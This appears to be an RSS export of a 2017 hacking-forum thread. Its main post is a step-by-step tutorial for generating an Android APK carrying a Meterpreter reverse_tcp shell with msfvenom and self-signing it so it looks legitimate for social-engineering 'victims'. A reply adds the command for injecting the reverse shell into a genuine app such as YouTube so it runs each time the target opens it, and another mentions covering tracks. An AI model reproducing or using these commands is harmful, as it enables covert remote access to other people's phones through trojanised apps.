<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Getting Shell on Android and signing the APK File</title>
    <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129</link>
    <description>As @pry0cc insisted that I create a post on how I manually signed a apk file in my [post](https://0x00sec.org/t/mindless-trolling-with-meterpreter/3107/9). As requested, here it is. Although please see this link [here](http://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref) which is the reference that I used for my so called 1337 hax. Before I begin, what you&#39;ll need is:

* Metasploit 
* Msfvenom 
* Payload
* keytool
* jarsigner 
* A brain (please)

#Generating apk file

The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpreter/reverse_tcp with lport 8080 and my external IP address. The command I used was:
``
msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8080 &gt; z.apk
``

Simple enough?

Of course you could try to just social engineer the apk file as it is, but I found that if you sign the apk file it is more &quot;realistic&quot;, but of course it is your choice.

#Signing apk file

There are two tools you&#39;ll need, Keytool and Jarsigner. The first step is generating the keystore. When I did this, I didn&#39;t change much for the command used. Why? It was late and I really didn&#39;t care that much. 

Anyways, the command used was:
``
keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
``

the command is pretty self explanatory.

Now it is time to sign the apk file using this command:
``
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname
``

Again, modify the flags as need be.

Of course, you could just verify the apk file with this command:
``
jarsigner -verify -verbose -certs APPNAME.apk
``

but I took the risk without checking the apk file because I&#39;m a 1337 haxor. 

And that&#39;s it. 

#Conclusion

Of course without having a victim it isn&#39;t fun doing all this sooo hard work. I gotta admit, this is lazy and a skid move, but when it comes to SE, it works almost all the time if you do it right. I do not recommend you to use meterpreter unless you are trolling like I do and this will not work on those that are intelligent enough. I recommend your very own coded reverse shell above all else like these [tut](https://0x00sec.org/t/remote-shells-part-i/269) that @0x00pf wrote which helped me out a lot to learn about reverse shells. Thank you! 

Anyways, I think that basically wraps everything up at least for now and I hope this does clear up some confusion and some doubts.

Cheers!</description>
    
    <lastBuildDate>Tue, 01 Aug 2017 20:40:47 +0000</lastBuildDate>
    <category>Social Engineering</category>
    <atom:link href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/6</link>
        <pubDate>Sun, 21 Jan 2018 00:38:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-6</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[whatskrakan_01]]></dc:creator>
        <description><![CDATA[
            <p>I recently have been playing around with Msfvenom and found that you can actually inject a payload inside an already legitimate .APK file. You can do this by downloading the app using a third party site, lets say we downloaded Youtube’s app or something. Say you wanted to set up a reverse TCP shell using Youtube.</p>
<p><code>msfvenom -x youtube.apk -p android/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[port of choice] -o [custom name for .APK file, something like youtubeV12.13.APK or something]</code></p>
<p>It should decompile the app, inject the payload, change the permissions and then load out the file with the name you selected.<br>
It should execute every time the target loads the app.</p>
<p>This is just for fun by the way, and I hope this doesn’t bring any, eh hem…unwanted attention…</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/5</link>
        <pubDate>Tue, 01 Aug 2017 20:32:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-5</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Nice! This could be really helpful to a lot of people. I would, however, recommend changing the title, it is super vague, perhaps “Getting a Shell on Android and Signing the APK”?</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/4</link>
        <pubDate>Tue, 01 Aug 2017 17:57:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-4</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[Red_Joker]]></dc:creator>
        <description><![CDATA[
            <p>I understand that but that’s not the point here. My point is experimentation that I found which for some reason works, like a lot. I guess it is up for perspective and this is a very very very very skiddish move. That I understand which is why most should code their own reverse shell instead of meterpreter.</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/3</link>
        <pubDate>Tue, 01 Aug 2017 17:46:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-3</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Soo… say that this attack is used… it doesn’t seem like you’re covering your tracks…</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/2</link>
        <pubDate>Tue, 01 Aug 2017 17:43:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-2</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
      <item>
        <title>Getting Shell on Android and signing the APK File</title>
        <dc:creator><![CDATA[Red_Joker]]></dc:creator>
        <description><![CDATA[
            <p>As <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> insisted that I create a post on how I manually signed a apk file in my <a href="https://0x00sec.org/t/mindless-trolling-with-meterpreter/3107/9">post</a>. As requested, here it is. Although please see this link <a href="http://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref" rel="nofollow noopener">here</a> which is the reference that I used for my so called 1337 hax. Before I begin, what you’ll need is:</p>
<ul>
<li>Metasploit</li>
<li>Msfvenom</li>
<li>Payload</li>
<li>keytool</li>
<li>jarsigner</li>
<li>A brain (please)</li>
</ul>
<p><span class="hashtag">#Generating</span> apk file</p>
<p>The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpreter/reverse_tcp with lport 8080 and my external IP address. The command I used was:<br>
<code>msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8080 &gt; z.apk</code></p>
<p>Simple enough?</p>
<p>Of course you could try to just social engineer the apk file as it is, but I found that if you sign the apk file it is more “realistic”, but of course it is your choice.</p>
<p><span class="hashtag">#Signing</span> apk file</p>
<p>There are two tools you’ll need, Keytool and Jarsigner. The first step is generating the keystore. When I did this, I didn’t change much for the command used. Why? It was late and I really didn’t care that much.</p>
<p>Anyways, the command used was:<br>
<code>keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code></p>
<p>the command is pretty self explanatory.</p>
<p>Now it is time to sign the apk file using this command:<br>
<code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname</code></p>
<p>Again, modify the flags as need be.</p>
<p>Of course, you could just verify the apk file with this command:<br>
<code>jarsigner -verify -verbose -certs APPNAME.apk</code></p>
<p>but I took the risk without checking the apk file because I’m a 1337 haxor.</p>
<p>And that’s it.</p>
<p><span class="hashtag">#Conclusion</span></p>
<p>Of course without having a victim it isn’t fun doing all this sooo hard work. I gotta admit, this is lazy and a skid move, but when it comes to SE, it works almost all the time if you do it right. I do not recommend you to use meterpreter unless you are trolling like I do and this will not work on those that are intelligent enough. I recommend your very own coded reverse shell above all else like these <a href="https://0x00sec.org/t/remote-shells-part-i/269">tut</a> that <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> wrote which helped me out a lot to learn about reverse shells. Thank you!</p>
<p>Anyways, I think that basically wraps everything up at least for now and I hope this does clear up some confusion and some doubts.</p>
<p>Cheers!</p>
          <p><a href="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129/1</link>
        <pubDate>Tue, 01 Aug 2017 17:32:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3129-1</guid>
        <source url="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129.rss">Getting Shell on Android and signing the APK File</source>
      </item>
  </channel>
</rss>
